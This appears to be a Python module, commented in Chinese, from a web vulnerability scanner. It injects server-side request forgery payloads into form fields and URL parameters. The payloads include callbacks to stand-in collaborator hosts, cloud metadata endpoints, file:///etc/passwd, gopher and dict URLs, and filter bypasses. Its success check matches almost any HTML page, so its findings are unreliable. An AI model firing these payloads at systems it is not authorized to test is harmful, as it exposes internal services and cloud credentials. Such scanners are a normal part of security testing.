#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
SSRF（服务器端请求伪造）扫描器模块，负责扫描SSRF漏洞
"""

import re
import logging
import random
import string
import time
import uuid
from urllib.parse import urlparse, urlencode, parse_qsl, unquote

logger = logging.getLogger('xss_scanner')

class SSRFScanner:
    """SSRF扫描器类，负责扫描服务器端请求伪造漏洞"""
    
    def __init__(self, http_client):
        """
        初始化SSRF扫描器
        
        Args:
            http_client: HTTP客户端对象
        """
        self.http_client = http_client
        
        # 生成唯一标识符，用于检测SSRF漏洞
        self.ssrf_id = str(uuid.uuid4()).replace('-', '')[:16]
        
        # SSRF检测域名
        # 注意：在实际使用中，应该使用攻击者控制的服务器
        # 这里提供的域名仅用于演示目的，需要替换为实际的回调服务器
        self.callback_domain = f"https://ssrf-check.example.com/{self.ssrf_id}"
        self.burp_collaborator = f"http://{self.ssrf_id}.burpcollaborator.net"
        self.interact_domain = f"http://{self.ssrf_id}.interact.sh"
        
        # SSRF检测Payload
        self.payloads = [
            # 基本检测
            self.callback_domain,
            self.burp_collaborator,
            self.interact_domain,
            
            # IP形式
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://0177.0000.0000.0001",  # 127.0.0.1的八进制表示
            "http://2130706433",  # 127.0.0.1的整数表示
            "http://0x7f.0x0.0x0.0x1",  # 127.0.0.1的十六进制表示
            
            # 内网 IP 范围
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://192.168.0.1",
            "http://169.254.169.254",  # AWS元数据
            "http://metadata.google.internal",  # GCP元数据
            
            # 不同端口
            "http://127.0.0.1:22",  # SSH
            "http://127.0.0.1:3306",  # MySQL
            "http://127.0.0.1:5432",  # PostgreSQL
            "http://127.0.0.1:6379",  # Redis
            "http://127.0.0.1:9200",  # Elasticsearch
            "http://127.0.0.1:8080",  # 常见Web端口
            
            # 不同协议
            "https://127.0.0.1",
            "ftp://127.0.0.1",
            "gopher://127.0.0.1:25/",  # SMTP
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",  # Redis
            
            # 平台相关
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean
            "http://169.254.169.254/metadata",  # Azure
            
            # URL编码绕过
            "http://%31%32%37%2e%30%2e%30%2e%31",  # 127.0.0.1
            "http://127.0.0.1%23@example.com",  # 使用URL片段
            "http://127.0.0.1%2f@example.com",  # 使用斜杠
            
            # DNS重绑定攻击
            f"http://{self.ssrf_id}.example.com",  # 会解析到内网IP
            
            # 使用用户名密码形式
            "http://user:pass@127.0.0.1",
            
            # 空字节绕过 (适用于某些语言)
            "http://127.0.0.1%00",
            
            # 使用域名 + 解析到内部IP的域名
            "http://spoofed.burpcollaborator.net",
            
            # 利用重定向的SSRF
            "http://redirector.example.com/?url=http://127.0.0.1"
        ]
        
        # 可能的SSRF成功特征
        self.success_patterns = [
            # 服务器响应特征
            "ssh-[0-9].[0-9]", # SSH banner
            "mysql", # MySQL
            "postgresql", # PostgreSQL
            "redis_version", # Redis
            "elastic", # Elasticsearch
            "instance-id", # AWS metadata
            "metadata", # Cloud metadata
            "computeMetadata", # GCP metadata
            
            # 常见HTTP回显内容
            "<!DOCTYPE html>",
            "<html",
            "<head",
            "<body",
            
            # 系统文件特征
            "root:.*:0:0:",
            "bin:.*:1:1:",
            
            # 错误消息特征
            "Connection refused",
            "No route to host",
            "Name or service not known",
            "Network is unreachable",
            
            # 特定应用程序的特征
            "Apache",
            "nginx",
            "IIS",
            "Express",
            "Tomcat",
            
            # HTTP头
            "X-Powered-By:",
            "Server:",
            
            # 自定义回调标记
            self.ssrf_id
        ]
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的SSRF漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        # 可能存在SSRF的字段名称
        ssrf_prone_fields = [
            'url', 'uri', 'link', 'host', 'ip', 'address', 'target', 'site',
            'website', 'web', 'src', 'source', 'dest', 'destination', 'redirect',
            'redirect_to', 'redirect_url', 'callback', 'api', 'endpoint',
            'webhook', 'proxy', 'fetch', 'resource', 'feed', 'service',
            'location', 'remote', 'forward', 'next', 'continue', 'return',
            'return_url', 'continue_url', 'next_url', 'request'
        ]
        
        # 如果字段名不包含敏感关键词，则跳过扫描
        field_name_lower = field['name'].lower()
        if not any(keyword in field_name_lower for keyword in ssrf_prone_fields):
            return None
            
        logger.debug(f"扫描SSRF: {field['name']} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 检测SSRF漏洞
        for payload in self.payloads:
            # 构建表单数据
            form_data = {}
            
            # 填充所有字段
            for f in form.get('fields', []):
                if f.get('name'):
                    # 如果是目标字段，则使用Payload
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        # 否则使用默认值
                        form_data[f['name']] = f.get('value', '')
            
            # 发送请求
            try:
                logger.debug(f"测试Payload: {payload}")
                
                if method == 'POST':
                    response = self.http_client.post(action_url, data=form_data)
                else:
                    response = self.http_client.get(action_url, params=form_data)
                    
                if not response:
                    continue
                    
                # 检查响应中是否包含成功特征
                if self._check_ssrf_success(response.text):
                    return {
                        'type': 'SSRF',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现服务器端请求伪造(SSRF)漏洞",
                        'details': f"表单提交到{action_url}的{field['name']}字段存在SSRF漏洞，可以访问内部网络资源",
                        'recommendation': "实施URL白名单，使用间接引用，禁止访问内部网络资源，限制响应大小和类型"
                    }
                    
                # 在实际环境中，还需要检查回调服务器是否收到了请求
                # 由于这是模拟环境，该步骤被省略
            except Exception as e:
                logger.error(f"扫描SSRF时发生错误: {str(e)}")
                
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的SSRF漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        # 可能存在SSRF的参数名称
        ssrf_prone_params = [
            'url', 'uri', 'link', 'host', 'ip', 'address', 'target', 'site',
            'website', 'web', 'src', 'source', 'dest', 'destination', 'redirect',
            'redirect_to', 'redirect_url', 'callback', 'api', 'endpoint',
            'webhook', 'proxy', 'fetch', 'resource', 'feed', 'service',
            'location', 'remote', 'forward', 'next', 'continue', 'return',
            'return_url', 'continue_url', 'next_url', 'request'
        ]
        
        # 如果参数名不包含敏感关键词，则跳过扫描
        param_lower = param.lower()
        if not any(keyword in param_lower for keyword in ssrf_prone_params):
            return None
            
        logger.debug(f"扫描SSRF参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则添加
        if param not in query_params:
            query_params[param] = ""
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 检测SSRF漏洞
        for payload in self.payloads:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 构建测试URL
            query_string = urlencode(inject_params)
            test_url = f"{base_url}?{query_string}"
            
            try:
                logger.debug(f"测试Payload: {payload}")
                
                # 发送请求
                response = self.http_client.get(test_url)
                if not response:
                    continue
                    
                # 检查响应中是否包含成功特征
                if self._check_ssrf_success(response.text):
                    return {
                        'type': 'SSRF',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'severity': '高',
                        'description': f"在URL参数'{param}'中发现服务器端请求伪造(SSRF)漏洞",
                        'details': f"URL参数{param}存在SSRF漏洞，可以访问内部网络资源",
                        'recommendation': "实施URL白名单，使用间接引用，禁止访问内部网络资源，限制响应大小和类型"
                    }
                    
                # 在实际环境中，还需要检查回调服务器是否收到了请求
                # 由于这是模拟环境，该步骤被省略
            except Exception as e:
                logger.error(f"扫描SSRF参数时发生错误: {str(e)}")
                
        return None
    
    def _check_ssrf_success(self, content):
        """
        检查响应内容中是否包含SSRF成功的特征
        
        Args:
            content: 响应内容
            
        Returns:
            bool: 是否包含SSRF成功特征
        """
        if not content:
            return False
            
        # 检查成功特征
        for pattern in self.success_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        return False
    
    def check_callback_server(self):
        """
        检查回调服务器是否收到请求（在实际环境中实现）
        
        Returns:
            bool: 是否收到回调请求
        """
        # 此功能在实际环境中需要实现
        # 这里只是一个占位函数
        return False
    
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True 